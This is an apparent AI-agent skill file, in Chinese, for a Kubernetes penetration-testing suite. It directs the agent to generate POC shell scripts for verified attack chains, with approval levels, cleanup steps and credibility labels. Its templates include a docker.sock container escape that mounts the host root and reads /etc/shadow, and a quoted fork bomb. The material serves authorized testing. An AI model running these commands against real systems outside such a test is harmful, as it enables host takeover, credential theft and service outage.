---
name: poc-generator
description: >
  POC 脚本生成。为确认漏洞和条件成立项生成可执行的 POC 脚本和操作说明。
  Phase 7 技能：从 chain_verification.md 中筛选 confirmed 和 condition_met 项，
  为每项生成可执行的 shell 脚本，每步标注执行上下文 [L0]/[L1]/[L2] 和可信度 C1/C2/C3，
  严格遵循 POC 格式规范（设计文档 5.16.5 节）。
  使用场景：Phase 6 验证了攻击链后。
  不使用场景：没有 confirmed 或条件成立的攻击链。
---

## §0 套件根定位（启动第一步，强制）

本 SKILL 中所有相对路径（`skills/shared/`、`attack-patterns/`、`compliance-rules/`、`hypothesis-libraries/`、`references/`）均**相对套件根**，不相对 cwd。

**错误示例**（实际发生过）：SKILL 写 `skills/shared/SSH_COMMANDS.md`，LLM 拿 cwd `~/.config/opencode/skills/` 拼接 → 解析为 `~/.config/opencode/skills/shared/SSH_COMMANDS.md`（丢失套件根段 `gencpt/`）→ Read 失败。正确应为 `~/.config/opencode/skills/gencpt/skills/shared/SSH_COMMANDS.md`。

**若入口已传入套件根绝对路径**：直接用作前缀拼接所有相对路径，**不重复 Glob**。

**若未传入套件根**：用 Glob 工具定位，按以下顺序尝试首个命中：
- Pattern 1: `**/skills/shared/SSH_COMMANDS.md` → 套件根 = 命中路径向上两级
- Pattern 2: `**/gencpt/SKILL.md` → 套件根 = 命中路径父目录
- Pattern 3: `**/GenCPT*/SKILL.md` → 套件根 = 命中路径父目录

所有 Read 调用拼接套件根前缀：`skills/shared/X.md` → Read `{套件根}/skills/shared/X.md`。**禁用 `$ROOT/...` 变量形式**，Read 工具不展开 shell 变量。**不许凭记忆猜套件根路径**。

---

# poc-generator — Phase 7 POC 生成

## MUST 输入

| 输入 | 来源 | 说明 |
|------|------|------|
| evidence/chains/chain_verification.md | Phase 6 | 每条链的验证结果、可信度判定、审批记录 |
| knowledge_graph/edges/attack.json | Phase 4a/4b | ATK-CAND 详情，含验证命令和差分证明 |
| knowledge_graph/edges/cross_ref.json | Phase 3/5 | 攻击链边，含链步骤和影响评估 |

## MUST 输出

| 输出 | 说明 |
|------|------|
| evidence/poc/poc_scripts/ | 每个 POC 一个 .sh 文件 |
| evidence/poc/poc_readme.md | 操作说明 + 风险警告 + 回滚步骤 |

## POC 格式规范（设计文档 5.16.5 节）

### 通用格式要求

所有 POC 必须遵循以下格式规范：

1. **可信度标注**：每个 POC 必须标注可信度等级
   - `C1 实证复现 ✅✅` — 5 项全满足 + L2 差分证明
   - `C2 条件实证 ✅` — 前置满足 + 理论链路完整
   - `C3 风险线索 ⚠️` — 配置隐患 + 前置不完全

2. **验证层级标注**：每个 POC 必须标注最高验证层级
   - `L1` — 只读探测验证
   - `L2` — 容器内攻击验证
   - `L3` — 条件验证（破坏性操作理论推导）

3. **每步标注执行上下文**：
   - `[L0]` — 宿主机观察（ssh_execute 直接执行）
   - `[L1]` — 容器内观察（kubectl exec）
   - `[L2]` — 容器内攻击验证（kubectl exec 攻击命令）

4. **L3 条件验证的特殊标注**：
   - POC 标题标注 ⚠️
   - 每步标注 `[L3-条件验证]`
   - 附不可安全复现原因说明
   - 替代证据章节

5. **破坏性 POC 的特殊标注**：
   - 标注 `destructive: true`
   - 附回滚步骤
   - 不含实际破坏性命令，只有条件验证的替代证据

### 差分证明的 L0 观测要求

生成 POC 脚本时，根据攻击类型强制要求差分证明包含 L0 观测：
- **AS-1 逃逸 / AS-5 DoS / AS-7 持久化**：POC 脚本必须包含 `[L0]` 攻击前基线快照和 `[L0]` 攻击后观测对比步骤
- **其他攻击类型**：POC 脚本至少包含 `[L1]` 基线和观测
- **hostpath-mount 例外**：POC 为 `[L0]` 检查 + `[L1]` 读取，无 L2 执行
- 不满足 L0 观测要求的 POC，在 poc_readme.md 中标注"⚠️ 差分证明不完整，可信度降级为 C2"

### C1 实证复现类 POC 格式

```bash
#!/bin/bash
# POC: 容器通过docker.sock逃逸至宿主机
# 可信度: C1 实证复现 ✅✅
# 验证层级: L2
# CHAIN: CHAIN-001 步骤 1/3
# ATK-CAND: ATK-CAND-001

SERVER="${1:?用法: $0 <server-name>}"
POC_DIR="/tmp/poc-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$POC_DIR"

echo "====== POC: 容器通过docker.sock逃逸至宿主机 ======"
echo "可信度: C1 实证复现 ✅✅"
echo "验证层级: L2"
echo ""

echo "### 步骤1: 确认前置条件 [L0+L1] ###"
echo "[L0] 检查Pod安全上下文..."
kubectl get pod backend-api -o jsonpath='{.spec.securityContext.privileged}'
# 期望输出: true

echo "[L1] 检查容器内docker.sock可见性..."
kubectl exec -n production backend-api -- ls -la /var/run/docker.sock
# 期望输出: srw-rw---- 1 root 999 ...

echo ""
echo "### 步骤2: 执行攻击验证 [L2] ###"
echo "[L2] 通过docker.sock逃逸..."
kubectl exec -n production backend-api -- docker run -v /:/host alpine ls /host/etc/shadow
# 期望输出: root:x:0:0:root:/root:/bin/sh ...

echo ""
echo "### 步骤3: 差分证明 [L0+L2] ###"
echo "[L0] 攻击前: docker ps 无异常容器"
echo "[L0] 攻击后: docker ps 出现新 alpine 容器"
echo "[L2] 攻击后: 可从容器内读取宿主机 /etc/shadow"

echo ""
echo "### 清理步骤 ###"
echo "[L2] 清理临时容器..."
kubectl exec -n production backend-api -- docker rm -f <container_id>
echo "[L0] 确认清理..."
docker ps | grep alpine
# 期望: 无残留容器
```

### C2 条件实证（不可安全复现）类 POC 格式

```bash
#!/bin/bash
# POC: 特权容器+无资源限制导致DoS
# ⚠️ 可信度: C2 条件实证 ✅ (不可安全复现)
# 验证层级: L3
# 不可复现原因: 实际执行fork bomb会导致宿主机CPU资源耗尽，影响生产环境
# CHAIN: CHAIN-002 步骤 2/2
# ATK-CAND: ATK-CAND-010

SERVER="${1:?用法: $0 <server-name>}"

echo "====== POC: 特权容器+无资源限制导致DoS ======"
echo "⚠️ 可信度: C2 条件实证 ✅ (不可安全复现)"
echo "验证层级: L3"
echo "不可复现原因: 实际执行fork bomb会导致宿主机CPU资源耗尽，影响生产环境"
echo ""

echo "### 步骤1: 确认前置条件 [L0] ###"
echo "[L0] 检查Pod特权模式..."
kubectl get pod xxx -o jsonpath='{.spec.securityContext.privileged}'
# 期望输出: true

echo "[L0] 检查资源限制..."
kubectl get pod xxx -o jsonpath='{.spec.containers[0].resources}'
# 期望输出: {} (无限制)

echo ""
echo "### 步骤2: 理论攻击路径 [⚠️ L3-条件验证] ###"
echo "⚠️ 以下步骤为理论推导，实际执行会导致服务不可用："
echo "  在特权容器内执行: :(){ :|:& };:"
echo "  预期影响: 宿主机CPU资源耗尽，所有Pod受影响"

echo ""
echo "### 替代证据 ###"
echo "[L0] 检查进程数限制..."
kubectl exec -n default test-pod -- cat /proc/sys/kernel/pids_limit
# 替代证据: 显示无限制或限制值极高

echo "[L1] 检查cgroup pids限制..."
kubectl exec -n default test-pod -- cat /sys/fs/cgroup/pids/pids.max
# 替代证据: 显示 max（未设置Pod级别限制）
```

### 破坏性 POC 格式

```bash
#!/bin/bash
# POC: <攻击名称>
# destructive: true
# 可信度: C2 条件实证 ⚠️
# 验证层级: L3
# ⚠️ 本POC包含破坏性操作，仅提供条件验证替代证据
# CHAIN: CHAIN-XXX
# ATK-CAND: ATK-CAND-XXX

SERVER="${1:?用法: $0 <server-name>}"

echo "====== POC: <攻击名称> ======"
echo "⚠️ destructive: true — 本POC为破坏性操作，只提供条件验证"
echo ""

echo "### 步骤1: 确认前置条件 [L0+L1] ###"
# 非破坏性条件检查命令

echo ""
echo "### 步骤2: 条件验证 [L3] ###"
# ⚠️ 不执行破坏性命令，只展示理论路径

echo ""
echo "### 回滚步骤 ###"
echo "本POC未执行任何破坏性操作，无需回滚"
echo "如果将来需要实际验证，回滚步骤如下："
echo "  1. <回滚步骤1>"
echo "  2. <回滚步骤2>"
```

## 核心工作流

### 步骤 1：筛选 POC 范围

从 `chain_verification.md` 中筛选 confirmed 和 condition_met 项：

**筛选规则**：

| 链验证状态 | 可信度 | 是否生成 POC | 说明 |
|-----------|--------|------------|------|
| confirmed | C1 | ✅ 生成完整 POC | 实证复现，5 项全满足 |
| condition_met | C2 | ✅ 生成 POC（附条件说明） | 条件成立，理论链路完整 |
| blocked | C2 | ✅ 生成 POC（附阻断机制） | 被安全机制阻断 |
| high_risk_clue | C3 | ❌ 不生成 | 前置条件不完全满足 |
| disproved | — | ❌ 不生成 | 已证伪 |

**筛选流程**：

```
1. Read chain_verification.md
2. 提取所有链的验证结果
3. 过滤出 confirmed 和 condition_met 的链
4. 对于 confirmed 的链：
   - 每个步骤的 ATK-CAND 都生成 POC
   - 信任等级 C1
5. 对于 condition_met 的链：
   - 每个步骤的 ATK-CAND 都生成 POC
   - 标注条件成立的限制（阻断机制或不可安全复现）
   - 信任等级 C2
6. 按 CHAIN 编号和步骤编号排列 POC
```

### 步骤 2：生成 POC 脚本

为每个 ATK-CAND 生成可执行的 shell 脚本。

**生成流程**：

```
对于每个需要 POC 的 ATK-CAND：
  1. 从 attack.json 读取该 ATK-CAND 的完整信息
  2. 从 attack-patterns/ 读取对应的攻击模式 SKILL.md
  3. 根据攻击模式 SKILL.md 的 8 段结构生成 POC：
     - 前置条件 → POC 步骤1（条件检查）
     - 探测命令 → POC 步骤1（条件检查）
     - 攻击验证 → POC 步骤2（攻击执行）
     - 差分证明 → POC 步骤3（差分验证）
  4. 根据验证层级和可信度添加标注：
     - C1 + L2: 完整可执行 POC
     - C2 + L3: 条件验证 POC（标注⚠️）
     - destructive: true: 破坏性 POC（标注 destructive: true + 回滚步骤）
  5. 添加清理步骤（每个 POC 都必须有清理步骤）
```

**POC 脚本结构**：

```bash
#!/bin/bash
# ========================================
# POC: <攻击名称>
# ========================================
# 可信度: <C1/C2/C3> <描述>
# 验证层级: <L1/L2/L3>
# destructive: <true/false>
# CHAIN: <CHAIN-XXX>
# ATK-CAND: <ATK-CAND-XXX>
# <如为不可安全复现: 不可复现原因: xxx>

SERVER="${1:?用法: $0 <server-name>}"
POC_DIR="/tmp/poc-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$POC_DIR"

echo "====== POC: <攻击名称> ======"
echo "可信度: <可信度标注>"
echo "验证层级: <验证层级>"
echo ""

# 步骤1: 确认前置条件 [L0+L1]
echo "### 步骤1: 确认前置条件 [L0+L1] ###"
# [L0] 宿主机观察命令
# [L1] 容器内观察命令

# 步骤2: 攻击验证 [L2] 或理论攻击路径 [⚠️ L3]
echo "### 步骤2: <攻击验证 / 理论攻击路径> [<L2/L3>] ###"
# [L2] 攻击命令 或 [L3] 理论推导

# 步骤3: 差分证明 [L0+L2] 或 替代证据 [L0+L1]
echo "### 步骤3: 差分证明 / 替代证据 ###"
# 差分证据或替代证据

# 清理步骤
echo "### 清理步骤 ###"
# 清理命令
# 确认清理

echo ""
echo "POC 执行完成"
```

**POC 命令生成规则**：

1. **所有命令必须从攻击模式 SKILL.md 的探测命令/攻击验证/差分证明章节中获取**
2. **不准凭记忆编写攻击命令** — 必须引用具体攻击模式 SKILL.md
3. **POC 命令必须可实际执行** — 理论推导步骤标注 ⚠️
4. **每个 POC 必须有清理步骤** — 非破坏性 POC 提供实际清理命令；破坏性 POC 说明理论上需要的回滚步骤
5. **SERVER 参数化** — 所有 SSH/kubectl 命令的 server 和 namespace/pod 名称参数化

### 步骤 3：生成操作说明

每步标注执行上下文 `[L0]`/`[L1]`/`[L2]` 和可信度 `C1`/`C2`/`C3`，生成 `poc_readme.md`。

**poc_readme.md 结构**：

```markdown
# POC 操作说明

## 概述

本目录包含渗透测试过程中验证的攻击链 POC 脚本。

| POC 脚本 | 攻击 | 可信度 | 验证层级 | CHAIN | 破坏性 |
|----------|------|--------|---------|-------|--------|
| poc_CHAIN-001_step1_socket_escape.sh | Docker套接字逃逸 | C1 ✅✅ | L2 | CHAIN-001 | 否 |
| poc_CHAIN-001_step2_secret_exfil.sh | Secret窃取 | C1 ✅✅ | L2 | CHAIN-001 | 否 |
| poc_CHAIN-001_step3_lateral_move.sh | 横向移动 | C2 ✅ | L3 | CHAIN-001 | 否 |

## 使用方法

### 前提条件
1. 已配置 SSH 连接的目标服务器
2. 已安装 kubectl 且已配置 kubeconfig
3. 已获取必要的审批（根据 POC 验证层级）
4. 已备份目标环境关键配置

### 执行方式
```bash
# 单个 POC 执行
bash evidence/poc/poc_scripts/poc_CHAIN-001_step1_socket_escape.sh <server-name>

# 按链顺序执行
for step in 1 2 3; do
  bash evidence/poc/poc_scripts/poc_CHAIN-001_step${step}_*.sh <server-name>
done
```

### 审批要求

| 验证层级 | 审批要求 | 说明 |
|---------|---------|------|
| L1 | 无需审批 | 只读探测 |
| L2 | 标准/自动 | 根据会话配置 |
| L3 | 快速/自动 | 条件验证，非破坏性 |
| L4 | 手动确认 | 逃逸验证 |
| L5 | 不可安全复现，理论验证 | 不可安全复现 |

## 风险警告

⚠️ **重要风险提示**：

1. **执行环境风险**：所有 POC 在生产环境执行前必须在测试环境验证
2. **数据泄露风险**：部分 POC 可能读取敏感数据（Secret、证书等），执行后立即清理
3. **服务中断风险**：标注 `destructive: true` 的 POC 可能导致服务中断
4. **不可逆操作风险**：部分攻击步骤可能创建持久性后门，务必执行清理步骤

## 可信度说明

| 标记 | 含义 | 说明 |
|------|------|------|
| C1 ✅✅ | 实证复现 | 5项门槛全满足 + L2 差分证明，实际可复现 |
| C2 ✅ | 条件实证 | 前置条件满足 + 理论链路完整，条件成立 |
| C2 ✅ (不可安全复现) | 条件实证 | 前置条件满足但实际执行影响生产，理论推导 |
| C3 ⚠️ | 高风险线索 | 配置隐患 + 前置不完全，建议补充验证 |

## 验证层级说明

| 层级 | 名称 | 执行位置 | 说明 |
|------|------|---------|------|
| L0 | 宿主机观察 | SSH 到宿主机 | 发现前置条件、收集配置信息 |
| L1 | 容器内观察 | kubectl exec 进入 Pod | 验证攻击者视角可见性 |
| L2 | 容器内攻击验证 | kubectl exec 执行攻击命令 | 实际复现漏洞路径 |
| L3 | 条件验证 | 不执行破坏性命令 | 理论推导（标注 ⚠️） |

## 回滚步骤

### 通用回滚
1. 清理 `/tmp/poc-*` 临时目录
2. 清理上传的临时工具 (`rm -rf /tmp/cpt-tools/`)
3. 删除 POC 创建的临时容器/Pod

### 各 POC 特定回滚
（每个 POC 的清理步骤已在脚本中包含）
```

### 步骤 4：打包输出

**输出文件组织**：

```
evidence/poc/
├── poc_scripts/
│   ├── poc_CHAIN-001_step1_socket_escape.sh
│   ├── poc_CHAIN-001_step2_secret_exfil.sh
│   ├── poc_CHAIN-001_step3_lateral_move.sh
│   ├── poc_CHAIN-002_step1_sa_exploit.sh
│   └── ...
└── poc_readme.md
```

**命名规则**：
- POC 脚本：`poc_{CHAIN-ID}_step{N}_{attack_slug}.sh`
- CHAIN-ID 和步骤编号从 chain_verification.md 获取
- attack_slug 从 ATK-CAND 对应的攻击模式名称生成（小写+下划线）

**脚本权限**：
- 所有 .sh 文件标记为可执行
- 包含 `set -euo pipefail` 错误处理

**POC 自检清单**（每个脚本生成后自检）：

- [ ] SERVER 参数化，不硬编码服务器名
- [ ] 包含前置条件检查步骤
- [ ] 包含攻击验证步骤（或理论推导 + ⚠️ 标注）
- [ ] 包含差分证明步骤（或替代证据）
- [ ] 包含清理步骤（破坏性 POC 包含回滚说明）
- [ ] 可信度标注（C1/C2/C3）
- [ ] 验证层级标注（L1/L2/L3）
- [ ] 每步标注执行上下文 `[L0]`/`[L1]`/`[L2]`
- [ ] CHAIN 和 ATK-CAND 编号正确
- [ ] L3 条件验证 POC 标注 ⚠️ 和不可安全复现原因
- [ ] 破坏性 POC 标注 `destructive: true`

## 检查点

完成前必须逐项确认：

- [ ] **① POC 脚本生成**：每个 confirmed/condition_met 的 ATK-CAND 都有对应的 .sh 文件
- [ ] **② 每个 POC 有 README**：poc_readme.md 包含使用方法、风险警告、回滚步骤
- [ ] **③ POC 可执行性自检**：每个 POC 脚本通过上述自检清单
- [ ] **④ QA 结构校验通过**：
  - poc_scripts/ 目录非空，每个 .sh 文件非空
  - poc_readme.md 非空
  - 每个 POC 脚本有可信度标注和验证层级标注
  - 每个 POC 脚本有 CHAIN 和 ATK-CAND 编号映射
  - L3 POC 有 ⚠️ 标注和不可安全复现原因
  - destructive POC 有回滚步骤
  - 无 `[ ]` 未检查标记残留

## 反幻觉硬约束

1. **不准凭记忆编写 POC 命令** — POC 中每条攻击命令必须从攻击模式 SKILL.md 或攻击假设库中查到出处
2. **不准伪造 SSH 输出** — POC 中的期望输出基于实际验证结果，不编造
3. **无证据不写 C1** — 只有 C1 实证复现的攻击才生成完整可执行 POC
4. **超出审批范围立即停** — L5 操作不生成实际执行命令
5. **省略词零容忍** — 不使用"等"、"..."、"+N"等省略表述
6. **占位符必须替换** — 所有【xxx】占位符必须替换为实际值

## 上下文控制

- 上下文预算 ≤100k tokens
- 先读 chain_verification.md 确认 POC 范围，只读需要生成 POC 的 ATK-CAND
- 每个 POC 生成后立即写盘，释放上下文
- 返回 supervisory-agent 的摘要 ≤500 tokens

## 独立运行参数

```
--server prod-k8s-01 --session-dir /path/to/session
```
